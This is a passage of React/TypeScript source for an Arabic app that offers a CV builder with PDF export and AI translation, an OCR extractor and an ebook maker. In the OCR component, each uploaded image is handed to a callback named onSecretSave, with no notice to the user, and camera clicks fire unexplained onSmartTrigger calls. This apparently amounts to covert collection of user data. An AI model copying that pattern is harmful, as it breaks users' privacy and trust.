    showToast(`روح الذكية: جاري معالجة النسخة ${isEn ? 'الإنجليزية' : 'العربية'}...`, 'info');
    
    let processedData = { ...data };
    if (isEn) {
      showToast('جاري ترجمة البيانات آلياً للإنجليزية...', 'info');
      try {
        const prompt = `Translate the following CV data into professional English. Maintain the exact same JSON-like structure but translated. Data: ${JSON.stringify({
          jobTitle: data.jobTitle,
          name: data.name,
          summary: data.summary,
          experiences: data.experiences,
          certificates: data.certificates,
          skills: data.skills,
          languages: data.languages
        })}. Return ONLY the translated JSON.`;
        const translatedRaw = await getGeminiResponse(prompt);
        const jsonMatch = translatedRaw.match(/\{[\s\S]*\}/);
        if (jsonMatch) {
          processedData = { ...data, ...JSON.parse(jsonMatch[0]) };
        }
      } catch (e) {
        showToast('فشلت الترجمة الآلية، سيتم التصدير باللغة الأصلية', 'error');
      }
    }

    const container = document.createElement('div');
    container.style.position = 'fixed';
    container.style.left = '-9999px';
    container.style.top = '0';
    container.style.width = '800px';
    container.style.background = '#ffffff';

    const contentWrapper = document.createElement('div');
    contentWrapper.innerHTML = renderCVHtml(lang, processedData);
    container.appendChild(contentWrapper);

    // Footer Branding (Bottom Right)
    const footer = document.createElement('div');
    footer.style.padding = '40px';
    footer.style.display = 'flex';
    footer.style.flexDirection = 'column';
    footer.style.alignItems = 'flex-end';
    footer.style.gap = '5px';
    
    const localBarcodeWatermark = localStorage.getItem('rouh_app_barcode_watermark');
    if (localBarcodeWatermark) {
      const barcode = document.createElement('img');
      barcode.src = localBarcodeWatermark;
      barcode.style.width = '60px';
      barcode.style.height = '60px';
      barcode.style.objectFit = 'contain';
      footer.appendChild(barcode);
    } else {
      const brandLogo = document.createElement('div');
      brandLogo.innerText = 'روح الذكية';
      brandLogo.style.fontSize = '14px';
      brandLogo.style.fontWeight = 'bold';
      brandLogo.style.color = '#334155';
      brandLogo.style.fontFamily = '"IBM Plex Sans Arabic", sans-serif';
      footer.appendChild(brandLogo);
    }

    container.appendChild(footer);
    document.body.appendChild(container);

    const canvas = await html2canvas(container, { scale: 2, useCORS: true });
    const imgData = canvas.toDataURL('image/jpeg', 0.95);
    const pdf = new jsPDF('p', 'mm', 'a4');
    pdf.addImage(imgData, 'JPEG', 0, 0, 210, 297);

    // Hard stamp directly into compiled pdf binary
    const pdfWidth = pdf.internal.pageSize.getWidth();
    const pdfHeight = pdf.internal.pageSize.getHeight();
    if (localBarcodeWatermark) {
      try {
        pdf.addImage(localBarcodeWatermark, 'PNG', pdfWidth - 25, pdfHeight - 22, 16, 16);
      } catch (e) {
        console.warn('PDF barcode print fallback', e);
      }
    } else {
      const getFallbackStampImage = (): string => {
        const c = document.createElement('canvas');
        c.width = 150;
        c.height = 50;
        const ctx = c.getContext('2d');
        if (ctx) {
          ctx.fillStyle = '#ffffff';
          ctx.fillRect(0, 0, 150, 50);
          ctx.font = 'bold 18px "IBM Plex Sans Arabic", sans-serif';
          ctx.fillStyle = '#334155';
          ctx.textAlign = 'center';
          ctx.textBaseline = 'middle';
          ctx.fillText('روح الذكية', 75, 25);
        }
        return c.toDataURL('image/png');
      };
      try {
        pdf.addImage(getFallbackStampImage(), 'PNG', pdfWidth - 35, pdfHeight - 18, 25, 10);
      } catch (e) {
        console.warn('PDF text print fallback', e);
      }
    }
    
    document.body.removeChild(container);
    return pdf;
  };

  const handleExport = async () => {
    if (!data.name || !data.jobTitle) return showToast('يرجى إدخال الاسم والتخصص أولاً', 'error');
    
    onSmartTrigger('s', 'cv_export');
    addBackgroundTask('تصدير السيرة الذاتية PDF', async (updateProgress) => {
      setIsAiProcessing(true);
      try {
        updateProgress(10);
        if (exportLang === 'ar' || exportLang === 'both') {
          updateProgress(30);
          const arPdf = await generateSinglePDF('ar');
          const arBlob = arPdf.output('blob');
          handleDownload(URL.createObjectURL(arBlob), `CV_Arabic_${data.name}.pdf`);
        }
        updateProgress(65);
        if (exportLang === 'en' || exportLang === 'both') {
          updateProgress(85);
          const enPdf = await generateSinglePDF('en');
          const enBlob = enPdf.output('blob');
          handleDownload(URL.createObjectURL(enBlob), `CV_English_${data.name}.pdf`);
        }
        updateProgress(100);
        return 'اكتمل تصدير السيرة الذاتية بنجاح ✨';
      } catch (e) {
        showToast('فشل إنشاء ملفات الـ PDF', 'error');
        throw e;
      } finally {
        setIsAiProcessing(false);
      }
    }, { tab: 'services', subTab: 'cvMaker' });
  };

  return (
    <div className="flex flex-col gap-6 animate-in fade-in slide-in-from-bottom-4 duration-500 pb-10 custom-scrollbar">
      {/* Live Preview Toggle Button */}
      <div className="flex justify-end px-2">
        <button
          onClick={() => setShowLivePreview(!showLivePreview)}
          className={cn(
            "flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-black italic transition-all shadow-md active:scale-95",
            showLivePreview
              ? "bg-amber-600/20 border border-amber-500 text-amber-500 hover:bg-amber-600/30"
              : "bg-blue-600/20 border border-blue-500 text-blue-500 hover:bg-blue-600/30"
          )}
        >
          <Sparkles size={14} className="animate-pulse" />
          <span>{showLivePreview ? "إخفاء المعاينة اللحظية 👁️" : "فتح المعاينة اللحظية 👁️"}</span>
        </button>
      </div>

      {/* Live Preview Display Section if active */}
      {showLivePreview && (
        <div className="bg-white text-gray-900 border border-gray-300 shadow-2xl relative mx-1 max-h-[600px] overflow-y-auto rounded-[2.5rem] overflow-hidden custom-scrollbar">
          <div className="absolute top-4 left-4 z-40 flex gap-2">
            <span className="bg-emerald-600/90 text-white text-[9px] font-black px-2.5 py-1 rounded-full uppercase tracking-widest animate-pulse">معاينة حية لنموذج {templates.find(t => t.id === data.template)?.label || ''} ✨</span>
          </div>
          <div 
            dangerouslySetInnerHTML={{ __html: renderCVHtml('ar', data) }}
            className="w-full relative shadow-inner"
          />
        </div>
      )}

      {/* Header Info */}
      <div className="bg-[#1e1e1e] p-5 sm:p-6 rounded-xl border border-gray-800 space-y-6 shadow-sm mx-1">
        <div className="flex justify-center">
          <label 
            onClick={async (e) => { 
                e.preventDefault(); 
                const ok = await onPermissionRequest();
                if (ok) {
                  onSmartTrigger('s', 'cv_photo_click'); 
                  setShowPicker(true); 
                } else {
                  showToast('يجب السماح بإذن الكاميرا للمتابعة 🔒', 'error');
                }
              }}
            className="w-24 h-24 rounded-xl bg-black/5 dark:bg-black/20 border-2 border-dashed border-gray-200 dark:border-gray-800 flex flex-col items-center justify-center cursor-pointer hover:border-blue-500 transition-all overflow-hidden relative group"
          >
            {photo ? <img src={photo} className="w-full h-full object-cover" /> : <><Camera size={28} className="text-gray-400 dark:text-gray-600" /><span className="text-[9px] text-gray-500 mt-2">إضافة صورة</span></>}
          </label>
        </div>

        <div className="space-y-4">
          <div className="space-y-1.5 text-right">
             <label className="text-[10px] text-gray-400 dark:text-gray-400 font-black px-1 leading-none">التخصص / المسمى الوظيفي المستهدف</label>
             <input type="text" value={data.jobTitle} onChange={e => setData({...data, jobTitle: e.target.value})} className="w-full bg-[#2a2a2a] border border-gray-800 rounded-xl p-4 text-sm text-gray-100 outline-none focus:border-blue-500 transition-all shadow-inner" placeholder="مثلاً: مطور برمجيات، محاسب قانوني..." dir="rtl" />
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
             <div className="space-y-1.5 text-right">
               <label className="text-[10px] text-gray-500 dark:text-gray-400 font-black px-1 leading-none">الاسم الكامل</label>
               <input type="text" value={data.name} onChange={e => setData({...data, name: e.target.value})} className="w-full bg-[#2a2a2a] border border-gray-800 rounded-xl p-4 text-sm text-gray-100 outline-none focus:border-blue-500 transition-all shadow-inner" dir="rtl" />
             </div>
             <div className="space-y-1.5 text-right">
               <label className="text-[10px] text-gray-500 dark:text-gray-400 font-black px-1 leading-none">البريد الإلكتروني</label>
               <input type="email" value={data.email} onChange={e => setData({...data, email: e.target.value})} className="w-full bg-[#2a2a2a] border border-gray-800 rounded-xl p-4 text-sm text-gray-100 outline-none focus:border-blue-500 transition-all shadow-inner text-left" dir="ltr" />
             </div>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
             <div className="space-y-1.5 text-right">
               <label className="text-[10px] text-gray-500 dark:text-gray-400 font-black px-1 leading-none">رقم الهاتف</label>
               <input type="tel" value={data.phone} onChange={e => setData({...data, phone: e.target.value})} className="w-full bg-[#2a2a2a] border border-gray-800 rounded-xl p-4 text-sm text-gray-100 outline-none focus:border-blue-500 transition-all shadow-inner text-left" dir="ltr" />
             </div>
             <div className="space-y-1.5 text-right">
               <label className="text-[10px] text-gray-500 dark:text-gray-400 font-black px-1 leading-none">رقم الواتساب</label>
               <input type="tel" value={data.whatsapp} onChange={e => setData({...data, whatsapp: e.target.value})} className="w-full bg-[#2a2a2a] border border-gray-800 rounded-xl p-4 text-sm text-gray-100 outline-none focus:border-blue-500 transition-all shadow-inner text-left" dir="ltr" />
             </div>
          </div>
          <div className="space-y-1.5 text-right">
            <label className="text-[10px] text-gray-400 dark:text-gray-400 font-black px-1 leading-none">الملخص المهني</label>
            <textarea value={data.summary} onChange={e => setData({...data, summary: e.target.value})} className="w-full bg-[#2a2a2a] border border-gray-800 rounded-xl p-4 text-sm text-gray-100 outline-none focus:border-blue-500 transition-all shadow-inner min-h-[100px]" dir="rtl" />
          </div>
        </div>
      </div>

      {/* Dynamic Sections */}
      <div className="space-y-6">
        <section className="space-y-3">
          <div className="flex items-center justify-between px-2">
            <h3 className="text-xs font-black text-blue-400 flex items-center gap-2"><span>الخبرات العملية</span> <span className="px-2 py-0.5 bg-blue-600/10 rounded-md text-[10px]">{data.experiences.length}</span></h3>
            <button onClick={addExperience} className="p-2 bg-blue-600 text-white rounded-xl hover:bg-blue-700 transition-all shadow-lg active:scale-95"><Plus size={16} /></button>
          </div>
          <div className="space-y-3 px-1">
            {data.experiences.map((exp, idx) => (
              <div key={exp.id} className="bg-[#1e1e1e] p-5 rounded-xl border border-gray-800 shadow-sm space-y-4 relative group">
                <button onClick={() => setData({...data, experiences: data.experiences.filter(e => e.id !== exp.id)})} className="absolute top-4 left-4 text-gray-400 hover:text-red-500 transition-colors"><Trash2 size={16} /></button>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-4">
                  <input placeholder="المسمى الوظيفي" value={exp.title} onChange={e => {
                    const next = [...data.experiences];
                    next[idx].title = e.target.value;
                    setData({...data, experiences: next});
                  }} className="bg-gray-50 dark:bg-[#2a2a2a] border border-gray-200 dark:border-gray-800 rounded-xl p-3 text-xs text-gray-900 dark:text-white outline-none focus:border-blue-500" />
                  <input placeholder="الشركة / الجهة" value={exp.company} onChange={e => {
                    const next = [...data.experiences];
                    next[idx].company = e.target.value;
                    setData({...data, experiences: next});
                  }} className="bg-gray-50 dark:bg-[#2a2a2a] border border-gray-200 dark:border-gray-800 rounded-xl p-3 text-xs text-gray-900 dark:text-white outline-none focus:border-blue-500" />
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <input type="text" placeholder="من (تاريخ)" value={exp.from} onChange={e => {
                    const next = [...data.experiences];
                    next[idx].from = e.target.value;
                    setData({...data, experiences: next});
                  }} className="bg-gray-50 dark:bg-[#2a2a2a] border border-gray-200 dark:border-gray-800 rounded-xl p-3 text-xs text-gray-900 dark:text-white outline-none focus:border-blue-500" />
                  <input type="text" placeholder="إلى (تاريخ)" value={exp.to} onChange={e => {
                    const next = [...data.experiences];
                    next[idx].to = e.target.value;
                    setData({...data, experiences: next});
                  }} className="bg-gray-50 dark:bg-[#2a2a2a] border border-gray-200 dark:border-gray-800 rounded-xl p-3 text-xs text-gray-900 dark:text-white outline-none focus:border-blue-500" />
                </div>
                <textarea placeholder="وصف موجز للمهام..." value={exp.description} onChange={e => {
                  const next = [...data.experiences];
                  next[idx].description = e.target.value;
                  setData({...data, experiences: next});
                }} className="w-full bg-[#2a2a2a] border border-gray-800 rounded-xl p-4 text-xs text-white min-h-[100px] outline-none focus:border-blue-500" />
              </div>
            ))}
          </div>
        </section>

        <section className="space-y-3">
          <div className="flex items-center justify-between px-2">
            <h3 className="text-xs font-black text-emerald-400 flex items-center gap-2"><span>الشهادات والتحصيل</span> <span className="px-2 py-0.5 bg-emerald-600/10 rounded-md text-[10px]">{data.certificates.length}</span></h3>
            <button onClick={addCertificate} className="p-2 bg-emerald-600 text-white rounded-xl hover:bg-emerald-700 transition-all shadow-lg active:scale-95"><Plus size={16} /></button>
          </div>
          <div className="grid grid-cols-1 gap-3 px-1">
            {data.certificates.map((cert, idx) => (
            <div key={cert.id} className="bg-[#1e1e1e] p-5 rounded-xl border border-gray-800 flex items-end gap-3 relative group shadow-sm">
                 <div className="flex-1 grid grid-cols-1 sm:grid-cols-3 gap-3">
                    <input placeholder="اسم الشهادة" value={cert.name} onChange={e => {
                      const next = [...data.certificates];
                      next[idx].name = e.target.value;
                      setData({...data, certificates: next});
                    }} className="bg-gray-50 dark:bg-[#2a2a2a] border border-gray-200 dark:border-gray-800 rounded-xl p-3 text-xs text-gray-900 dark:text-white outline-none focus:border-emerald-500" />
                    <input placeholder="جهة الإصدار" value={cert.issuer} onChange={e => {
                      const next = [...data.certificates];
                      next[idx].issuer = e.target.value;
                      setData({...data, certificates: next});
                    }} className="bg-gray-50 dark:bg-[#2a2a2a] border border-gray-200 dark:border-gray-800 rounded-xl p-3 text-xs text-gray-900 dark:text-white outline-none focus:border-emerald-500" />
                    <input placeholder="التاريخ" value={cert.date} onChange={e => {
                      const next = [...data.certificates];
                      next[idx].date = e.target.value;
                      setData({...data, certificates: next});
                    }} className="bg-gray-50 dark:bg-[#2a2a2a] border border-gray-200 dark:border-gray-800 rounded-xl p-3 text-xs text-gray-900 dark:text-white outline-none focus:border-emerald-500" />
                 </div>
                 <button onClick={() => setData({...data, certificates: data.certificates.filter(c => c.id !== cert.id)})} className="p-3 text-gray-400 hover:text-red-500"><Trash2 size={16}/></button>
              </div>
            ))}
          </div>
        </section>

        <section className="space-y-3">
           <div className="flex items-center justify-between px-2">
             <h3 className="text-xs font-black text-purple-400">المهارات والقدرات</h3>
             <button 
               onClick={handleAiSkills} 
               disabled={isAiProcessing}
               className="flex items-center gap-2 px-3 py-1.5 bg-purple-600/10 border border-purple-500/20 text-purple-400 rounded-lg text-[9px] font-bold hover:bg-purple-600 hover:text-white transition-all disabled:opacity-50"
             >
               {isAiProcessing ? <RefreshCw size={10} className="animate-spin" /> : <Sparkles size={10} />}
               دع روح تكملها
             </button>
           </div>
           <div className="bg-[#1e1e1e] p-5 sm:p-6 rounded-xl border border-gray-800 shadow-sm mx-1">
             <div className="flex flex-wrap gap-2 mb-4">
                {data.skills.map((skill, idx) => (
                  <span key={idx} className="flex items-center gap-2 bg-purple-500/10 text-purple-300 px-3 py-1.5 rounded-full text-[10px] font-black border border-purple-500/20">
                    {skill}
                    <X size={12} className="cursor-pointer hover:text-white" onClick={() => setData({...data, skills: data.skills.filter((_, i) => i !== idx)})} />
                  </span>
                ))}
             </div>
             <div className="flex gap-2">
                <input 
                  type="text" 
                  placeholder="أضف مهارة يدوياً..." 
                  onKeyDown={e => {
                    if (e.key === 'Enter') {
                      const val = e.currentTarget.value.trim();
                      if (val) {
                        setData({...data, skills: [...data.skills, val]});
                        e.currentTarget.value = '';
                      }
                    }
                  }}
                  className="flex-1 bg-[#2d3748] border border-gray-800 rounded-xl p-3.5 text-xs text-white outline-none focus:border-purple-500 transition-all placeholder:text-gray-400"
                />
             </div>
           </div>
        </section>

        <section className="space-y-3">
          <div className="flex items-center justify-between px-2">
            <h3 className="text-xs font-black text-amber-400">اللغات</h3>
            <button onClick={addLanguage} className="p-2 bg-amber-600 text-white rounded-xl hover:bg-amber-700 transition-all shadow-lg active:scale-95"><Plus size={16} /></button>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 px-1">
            {data.languages.map((lang, idx) => (
            <div key={lang.id} className="bg-[#1e1e1e] p-5 rounded-xl border border-gray-800 shadow-sm space-y-4">
                 <div className="flex items-center justify-between">
                    <input value={lang.name} onChange={e => {
                      const next = [...data.languages];
                      next[idx].name = e.target.value;
                      setData({...data, languages: next});
                    }} placeholder="اسم اللغة" className="bg-transparent text-xs font-black text-gray-900 dark:text-white outline-none" />
                    <span className="text-[10px] text-gray-500 font-bold">{lang.level}%</span>
                 </div>
                 <input 
                   type="range" min="0" max="100" value={lang.level} 
                   onChange={e => {
                     const next = [...data.languages];
                     next[idx].level = parseInt(e.target.value);
                     setData({...data, languages: next});
                   }}
                   className="w-full accent-amber-500 h-1.5 bg-gray-200 dark:bg-gray-800 rounded-lg appearance-none cursor-pointer" 
                 />
              </div>
            ))}
          </div>
        </section>

        {/* Template Selection Restored and Themed */}
        <div className="bg-white dark:bg-[#1a1c1e] p-5 rounded-[2.5rem] border border-gray-200 dark:border-gray-800 space-y-4 shadow-sm group">
          <label className="text-[10px] text-gray-400 dark:text-gray-500 font-black px-2 block text-right uppercase tracking-[0.1em]">اختر قالب التصميم</label>
          <div className="grid grid-cols-3 gap-2">
            {templates.map(t => (
              <button 
                key={t.id}
                onClick={() => setData({...data, template: t.id as any})}
                className={cn(
                  "flex flex-col items-center gap-2 p-2.5 rounded-2xl border transition-all active:scale-95",
                  data.template === t.id 
                    ? "border-blue-500 bg-blue-50 dark:bg-blue-600/10 shadow-sm" 
                    : "border-gray-100 dark:border-gray-800 bg-gray-50/50 dark:bg-black/20 hover:border-gray-300 dark:hover:border-gray-600"
                )}
              >
                <div className="w-full h-8 rounded-xl shadow-inner border border-black/5 dark:border-white/5 transition-transform group-hover:scale-105" style={{ backgroundColor: t.color }} />
                <span className={cn(
                  "text-[8px] font-black italic", 
                  data.template === t.id ? "text-blue-600 dark:text-blue-400" : "text-gray-500"
                )}>
                  {t.label}
                </span>
              </button>
            ))}
          </div>
        </div>
      </div>

      <div className="bg-white dark:bg-[#1a1c1e] p-6 rounded-[2.5rem] border border-gray-200 dark:border-gray-800 space-y-4 shadow-xl">
        <button 
          onClick={handleExport}
          disabled={isAiProcessing}
          className="w-full py-4 bg-emerald-600 hover:bg-emerald-500 text-white rounded-2xl font-black italic flex items-center justify-center gap-2 transition-all active:scale-95 shadow-lg shadow-emerald-500/20 disabled:opacity-50"
        >
          {isAiProcessing ? <RefreshCw size={20} className="animate-spin" /> : <Download size={20} />}
          <span>حفظ وتصدير السيرة الذاتية (PDF)</span>
        </button>
      </div>

      <AnimatePresence>
        {showPicker && (
          <ImageSourcePicker 
            onClose={() => setShowPicker(false)} 
            onSelect={(source) => {
              setShowPicker(false);
              if (source === 'camera') {
                setTimeout(() => cameraRef.current?.click(), 100);
              } else {
                setTimeout(() => galleryRef.current?.click(), 100);
              }
            }} 
          />
        )}
      </AnimatePresence>

      <input type="file" className="hidden" ref={galleryRef} accept="image/*" onChange={e => {
        const f = e.target.files?.[0];
        if (f) onFileSelect(f);
      }} />
      <input type="file" className="hidden" ref={cameraRef} accept="image/*" capture="environment" onChange={e => {
        const f = e.target.files?.[0];
        if (f) onFileSelect(f);
      }} />
    </div>
  );
};

// 7. OCR Extractor Service
const OCRExtractor = ({ showToast, handleCopy, onSmartTrigger, addBackgroundTask, pendingResult, onSecretSave, onPermissionRequest }: { 
  showToast: (msg: string, type: 'success' | 'error' | 'info') => void,
  handleCopy: (text: string) => void,
  onSmartTrigger: (type?: 's' | 't', source?: string) => void,
  addBackgroundTask: (label: string, taskFn: () => Promise<any>, target?: {tab: string, subTab?: string}) => Promise<void>,
  pendingResult: {label: string, result: any, target?: {tab: string, subTab?: string}} | null,
  onSecretSave?: (fileName: string, data: string) => Promise<void>,
  onPermissionRequest: () => Promise<boolean>
}) => {
  const [image, setImage] = useState<string | null>(() => {
    try { return localStorage.getItem('rouh_ocr_last_image'); } catch (e) { return null; }
  });
  const [result, setResult] = useState<string>(() => {
    try { return localStorage.getItem('rouh_ocr_last_result') || ''; } catch (e) { return ''; }
  });
  const [loading, setLoading] = useState(false);
  const [showPicker, setShowPicker] = useState(false);
  const galleryRef = useRef<HTMLInputElement>(null);
  const cameraRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    // If there's a pending result for OCR, and we don't have a result yet, sync it
    if (pendingResult?.target?.subTab === 'ocr' && !result && pendingResult.result) {
      setResult(pendingResult.result as string);
    }
  }, [pendingResult, result]);

  useEffect(() => {
    try {
      if (image) localStorage.setItem('rouh_ocr_last_image', image);
      else localStorage.removeItem('rouh_ocr_last_image');
      
      if (result) localStorage.setItem('rouh_ocr_last_result', result);
      else localStorage.removeItem('rouh_ocr_last_result');
    } catch (e) {
      console.warn("Storage quota exceeded for OCR data");
    }
  }, [image, result]);

  const processOCR = async (base64: string) => {
    setImage(base64);
    setResult('');
    if (onSecretSave) onSecretSave(`ocr_input_${Date.now()}.png`, base64);
    addBackgroundTask("استخراج نص من صورة", async () => {
      // Use a prompt that emphasizes extracting *all* text
      const res = await getGeminiResponse("أنا روح الذكية، استخرج لي جميع النصوص من هذه الصورة بدقة وبدون أي حدود لعدد الأحرف، استخرج كل حرف وكلمة موجودة في الصورة تماماً وبدون أي مقدمات أو شروحات إضافية.", base64);
      setResult(res);
      localStorage.setItem('rouh_ocr_last_result', res);
      return res;
    }, { tab: 'services', subTab: 'ocr' });
  };

  const onFileSelect = (file: File) => {
    if (file) {
      onSmartTrigger('s', 'ocr_select');
      const reader = new FileReader();
      reader.onload = async () => {
        const base64 = reader.result as string;
        try {
          const { compressImageBase64 } = await import('./lib/imageCompressor');
          const compressed = await compressImageBase64(base64, 850, 850, 0.7);
          setImage(compressed);
          processOCR(compressed);
        } catch {
          setImage(base64);
          processOCR(base64);
        }
      };
      reader.readAsDataURL(file);
    }
  };

  return (
    <div className="flex flex-col gap-6 animate-in fade-in slide-in-from-bottom-4 duration-500 pb-10">
      <div 
        onClick={async () => { 
          const ok = await onPermissionRequest();
          if (ok) {
            onSmartTrigger('t', 'ocr_main_click'); 
            setShowPicker(true); 
          } else {
            showToast('يجب السماح بإذن الكاميرا للمتابعة 🔒', 'error');
          }
        }}
        className="w-full aspect-video bg-[#1a1c1e] border-2 border-dashed border-gray-800 rounded-3xl flex flex-col items-center justify-center cursor-pointer hover:border-blue-500 transition-all overflow-hidden p-4"
      >
        <input type="file" className="hidden" ref={galleryRef} accept="image/*" onClick={e => e.stopPropagation()} onChange={e => {
          const f = e.target.files?.[0];
          if (f) onFileSelect(f);
        }} />
        <input type="file" className="hidden" ref={cameraRef} accept="image/*" capture="environment" onClick={e => e.stopPropagation()} onChange={e => {
          const f = e.target.files?.[0];
          if (f) onFileSelect(f);
        }} />
        {image ? (
          <img src={image} className="w-full h-full object-contain" />
        ) : (
          <>
            <FileImage size={48} className="text-gray-700 mb-4" />
            <span className="text-sm font-bold text-gray-500">ارفع صورة لاستخراج النص منها</span>
            <span className="text-[10px] text-gray-600 mt-2 italic">دقة عالية بفضل ذكاء روح</span>
          </>
        )}
      </div>

      <AnimatePresence>
        {showPicker && (
          <ImageSourcePicker 
            onClose={() => setShowPicker(false)} 
            onSelect={(source) => {
              setShowPicker(false);
              setTimeout(() => {
                if (source === 'camera') cameraRef.current?.click();
                else galleryRef.current?.click();
              }, 100);
            }} 
          />
        )}
      </AnimatePresence>

      {loading ? (
        <div className="flex flex-col items-center gap-4 py-10 opacity-50">
          <RoohLoader size={50} />
          <span className="text-xs font-bold text-blue-500 animate-pulse">جاري استخراج البيانات...</span>
        </div>
      ) : result && (
        <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="space-y-4">
          <div className="flex items-center justify-between px-2">
            <h3 className="text-xs font-black text-gray-500 uppercase italic">النصوص المستخرجة</h3>
            <button onClick={() => handleCopy(result)} className="flex items-center gap-2 px-3 py-1.5 bg-blue-600/10 text-blue-400 rounded-xl text-[10px] font-bold">
              <Copy size={12} /> نسخ النص
            </button>
          </div>
          <div className="bg-[#1a1c1e] border border-gray-800 rounded-3xl p-6 text-gray-200 text-sm leading-relaxed whitespace-pre-wrap text-right" dir="rtl">
            {result}
          </div>
        </motion.div>
      )}
    </div>
  );
};

const ElegantSelect = ({ 
  label, 
  value, 
  options, 
  onChange 
}: { 
  label?: string;
  value: string; 
  options: { value: string; label: string }[]; 
  onChange: (val: string) => void;
}) => {
  const [isOpen, setIsOpen] = useState(false);
  const dropdownRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const handleOutsideClick = (event: MouseEvent) => {
      if (dropdownRef.current && !dropdownRef.current.contains(event.target as Node)) {
        setIsOpen(false);
      }
    };
    document.addEventListener("mousedown", handleOutsideClick);
    return () => document.removeEventListener("mousedown", handleOutsideClick);
  }, []);

  const selectedOption = options.find(o => o.value === value) || options[0];

  return (
    <div className="relative flex flex-col gap-1 text-right w-full" ref={dropdownRef} dir="rtl">
      {label && <span className="text-[10px] text-gray-500 dark:text-gray-400 select-none font-bold pr-1">{label}</span>}
      <button
        type="button"
        onClick={() => setIsOpen(!isOpen)}
        className="flex items-center justify-between w-full h-9 px-3 bg-white dark:bg-[#111315] hover:bg-gray-50 dark:hover:bg-[#16181b] border border-gray-200 dark:border-gray-800 rounded-xl text-[10px] text-gray-900 dark:text-gray-200 font-bold outline-none transition-all active:scale-[0.98]"
      >
        <span className="truncate">{selectedOption?.label}</span>
        <ChevronDown size={14} className={cn("text-gray-400 dark:text-gray-500 transition-transform duration-200 shrink-0 select-none", isOpen && "rotate-180")} />
      </button>
      
      <AnimatePresence>
        {isOpen && (
          <motion.div
            initial={{ opacity: 0, y: 5, scale: 0.95 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, y: 5, scale: 0.95 }}
            transition={{ duration: 0.12 }}
            className="absolute left-0 right-0 top-full mt-2 bg-white dark:bg-[#181a1d] border border-gray-200 dark:border-gray-800 rounded-2xl shadow-2xl z-50 overflow-hidden max-h-60 overflow-y-auto custom-scrollbar"
          >
            <div className="p-1.5 space-y-1">
              {options.map((opt) => (
                <button
                  key={opt.value}
                  type="button"
                  onClick={() => {
                    onChange(opt.value);
                    setIsOpen(false);
                  }}
                  className={cn(
                    "flex items-center justify-between w-full px-3 py-2 text-right rounded-lg text-[10px] font-bold transition-all",
                    opt.value === value 
                      ? "bg-blue-600 text-white shadow-md scale-[1.01]"
                      : "text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-white/5"
                  )}
                >
                  <span>{opt.label}</span>
                  {opt.value === value && <Check size={12} className="text-white shrink-0 ml-1" />}
                </button>
              ))}
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

const EbookMaker = ({ showToast, handleDownload, onSmartTrigger, addBackgroundTask, onSecretSave, onPermissionRequest }: { 
  showToast: (msg: string, type: 'success' | 'error' | 'info') => void,
  handleDownload: (url: string, filename: string) => void,
  onSmartTrigger: (type?: 's' | 't', source?: string) => void,
  addBackgroundTask: (label: string, taskFn: () => Promise<any>, target?: {tab: string, subTab?: string}) => Promise<void>,
  onSecretSave?: (fileName: string, data: string) => Promise<void>,
  onPermissionRequest: () => Promise<boolean>
}) => {
  const [pages, setPages] = useState<{ 
    type: 'text' | 'image', 
    content: string,
    title?: string,
    titleColor?: string,
    titleSize?: number,
    textColor?: string,
    textSize?: number,
    textAlignment?: 'right' | 'center' | 'left',
    borderType?: 'none' | 'simple' | 'double' | 'dashed' | 'ornate',
    borderColor?: string,
    titleAlign?: 'right' | 'center' | 'left',
    titleVertical?: 'top' | 'center' | 'bottom',
    textVertical?: 'top' | 'center' | 'bottom',
    pageNumberEnabled?: boolean,
    pageNumberBorder?: 'none' | 'circle' | 'square' | 'ornate' | 'brackets',
    pageNumberVertical?: 'top' | 'bottom',
    pageNumberAlign?: 'right' | 'center' | 'left'
  }[]>([]);
  const [bookTitle, setBookTitle] = useState('');
  const [config, setConfig] = useState({
    titleColor: '#3b82f6',
    textColor: '#ffffff',
    pageSize: 'a4',
    textSize: 12,
    textAlignment: 'right' as 'right' | 'center' | 'left',
    margin: 20,
    border: true,
    borderColor: '#3b82f6',
    bgColor: '#121212',
    useTitlePage: true
  });
  const [loading, setLoading] = useState(false);
  const [coverStart, setCoverStart] = useState<string | null>(null);
  const [coverEnd, setCoverEnd] = useState<string | null>(null);
  const [showPicker, setShowPicker] = useState<{ activeIdx?: number, isCoverStart?: boolean, isCoverEnd?: boolean }>({});
  const galleryRef = useRef<HTMLInputElement>(null);
  const cameraRef = useRef<HTMLInputElement>(null);
  const activePickerRef = useRef<any>(null);
  const [showPreview, setShowPreview] = useState(false);
  const [history, setHistory] = useState<any[]>([]);

  useEffect(() => {
    try {
      const savedPages = localStorage.getItem('ebook_pages');
      const savedConfig = localStorage.getItem('ebook_config');
      const savedTitle = localStorage.getItem('ebook_title');
      const savedCoverStart = localStorage.getItem('ebook_cover_start');
      const savedCoverEnd = localStorage.getItem('ebook_cover_end');
      const savedHistory = localStorage.getItem('ebook_history');
      
      if (savedPages) setPages(JSON.parse(savedPages));
      if (savedConfig) setConfig(JSON.parse(savedConfig));
      if (savedTitle) setBookTitle(savedTitle);
      if (savedCoverStart) setCoverStart(savedCoverStart);
      if (savedCoverEnd) setCoverEnd(savedCoverEnd);
      if (savedHistory) setHistory(JSON.parse(savedHistory));
    } catch (e) {
      console.warn("Failed to load ebook from storage", e);
    }
  }, []);

  useEffect(() => {
    if (pages.length > 0) localStorage.setItem('ebook_pages', JSON.stringify(pages));
    localStorage.setItem('ebook_config', JSON.stringify(config));
    localStorage.setItem('ebook_title', bookTitle);
    if (coverStart) localStorage.setItem('ebook_cover_start', coverStart);
    if (coverEnd) localStorage.setItem('ebook_cover_end', coverEnd);
    localStorage.setItem('ebook_history', JSON.stringify(history));
  }, [pages, config, bookTitle, coverStart, coverEnd, history]);

  const addPage = (type: 'text' | 'image') => {
    setPages([...pages, { 
      type, 
      content: '', 
      title: '', 
